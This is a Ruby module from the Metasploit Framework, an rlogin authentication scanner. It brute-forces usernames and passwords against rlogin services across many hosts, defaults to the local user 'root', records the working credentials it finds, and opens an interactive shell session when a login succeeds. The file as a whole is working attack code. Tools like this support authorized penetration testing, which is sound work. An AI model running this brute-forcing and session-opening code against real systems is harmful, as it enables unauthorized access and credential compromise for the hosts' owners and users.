##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::RServices
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Login
	include Msf::Auxiliary::CommandShell

	def initialize
		super(
			'Name'        => 'rlogin Authentication Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module will test an rlogin service on a range of machines and
				report successful logins.

				NOTE: This module requires access to bind to privileged ports (below 1024).
			},
			'References' =>
				[
					[ 'CVE', '1999-0651' ]
				],
			'Author'      => [ 'jduck' ],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(513),
				OptString.new('TERM',  [ true, 'The terminal type desired', 'vt100' ]),
				OptString.new('SPEED', [ true, 'The terminal speed desired', '9600' ])
			], self.class)
	end

	def run_host(ip)
		print_status("#{ip}:#{rport} - Starting rlogin sweep")

		luser = datastore['LOCALUSER']
		luser ||= 'root'

		begin
			each_user_pass { |user, pass|
				try_user_pass(user, pass, luser)
			}
		rescue ::Rex::ConnectionError
			nil
		end
	end

	def try_user_pass(user, pass, luser)
		vprint_status "#{rhost}:#{rport} rlogin - Attempting: '#{user}':'#{pass}' from '#{luser}'"
		this_attempt ||= 0
		ret = nil
		while this_attempt <= 3 and (ret.nil? or ret == :refused)
			if this_attempt > 0
				select(nil,nil,nil, 2**this_attempt)
				vprint_error "#{rhost}:#{rport} rlogin - Retrying '#{user}':'#{pass}' from '#{luser}' due to reset"
			end
			ret = do_login(user, pass, luser)
			this_attempt += 1
		end

		case ret
		when :no_auth_required
			print_good "#{rhost}:#{rport} rlogin - No authentication required!"
			return :abort

		when :no_pass_prompt
			vprint_status "#{rhost}:#{rport} rlogin - Skipping '#{user}' due to missing password prompt"
			return :skip_user

		when :timeout
			vprint_status "#{rhost}:#{rport} rlogin - Skipping '#{user}':'#{pass}' from '#{luser}' due to timeout"

		when :busy
			vprint_error "#{rhost}:#{rport} rlogin - Skipping '#{user}':'#{pass}' from '#{luser}' due to busy state"

		when :refused
			vprint_error "#{rhost}:#{rport} rlogin - Skipping '#{user}':'#{pass}' from '#{luser}' due to connection refused."

		when :skip_user
			vprint_status "#{rhost}:#{rport} rlogin - Skipping disallowed user '#{user}' for subsequent requests"
			return :skip_user

		when :success
			# session created inside do_login, ignore
			return :next_user

		else
			if login_succeeded?
				start_rlogin_session(rhost, rport, user, luser, pass, @trace)
				return :next_user
			end
		end
	end


	# Sometimes telnet servers start RSTing if you get them angry.
	# This is a short term fix; the problem is that we don't know
	# if it's going to reset forever, or just this time, or randomly.
	# A better solution is to get the socket connect to try again
	# with a little backoff.
	def connect_reset_safe
		begin
			# We must connect from a privileged port.
			connect_from_privileged_port
		rescue Rex::ConnectionRefused
			return :refused
		end
		return :connected
	end


	def do_login(user, pass, luser)
		return :refused if connect_reset_safe == :refused

		sock.put("\x00#{luser}\x00#{user}\x00#{datastore['TERM']}/#{datastore['SPEED']}\x00")

		# Read the expected nul byte response.
		buf = sock.get_once(1)
		return :abort if buf != "\x00"

		# NOTE: We report this here, since we are awfully convinced now that this is really
		# an rlogin service.
		report_service(
			:host => rhost,
			:port => rport,
			:proto => 'tcp',
			:name => 'rlogin'
		)

		# Receive the initial response
		Timeout.timeout(10) do
			recv
		end

		if busy_message?
			self.sock.close unless self.sock.closed?
			return :busy
		end

		# If we're not trusted, we should get a password prompt. Otherwise, we might be in already :)
		if login_succeeded?
			# should we report a vuln here? rlogin allowed w/o password?!
			print_good("#{target_host}:#{rport}, rlogin '#{user}' from '#{luser}' with no password.")
			start_rlogin_session(rhost, rport, user, luser, pass, @trace)
			return :success
		end

		recvd_sample = @recvd.dup
		# Allow for slow echos
		1.upto(10) do
			recv_telnet(self.sock, 0.10) unless @recvd.nil? or @recvd[/#{@password_prompt}/]
		end

		vprint_status("#{rhost}:#{rport} Prompt: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")

		# Not successful yet, maybe we got a password prompt.
		if password_prompt?
			send_pass(pass)

			# Allow for slow echos
			1.upto(10) do
				recv_telnet(self.sock, 0.10) if @recvd == recvd_sample
			end

			vprint_status("#{rhost}:#{rport} Result: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")

			if login_succeeded?
				print_good("#{target_host}:#{rport}, rlogin '#{user}' : '#{pass}' from '#{luser}'")
				start_rlogin_session(rhost, rport, user, luser, pass, @trace)
				return :success
			else
				return :fail
			end
		else
			if login_succeeded? && @recvd !~ /^#{user}\x0d*\x0a/
				return :success
			else
				self.sock.close unless self.sock.closed?
				return :no_pass_prompt
			end
		end

	# For debugging only.
	#rescue ::Exception
	#	print_error("#{$!}")

	ensure
		disconnect()
	end


	def start_rlogin_session(host, port, user, luser, pass, proof)

		report_auth_info(
			:host	=> host,
			:port	=> port,
			:sname => 'rlogin',
			:user	=> user,
			:pass	=> pass,
			:luser => luser,
			:proof  => proof,
			:active => true
		)

		merge_me = {
			'USERPASS_FILE' => nil,
			'USER_FILE'     => nil,
			'PASS_FILE'     => nil,
			'USERNAME'      => user,
			'LOCALUSER'     => luser,
			'PASSWORD'      => pass
		}

		start_session(self, "RLOGIN #{user}:#{pass} (#{host}:#{port})", merge_me)
	end

end
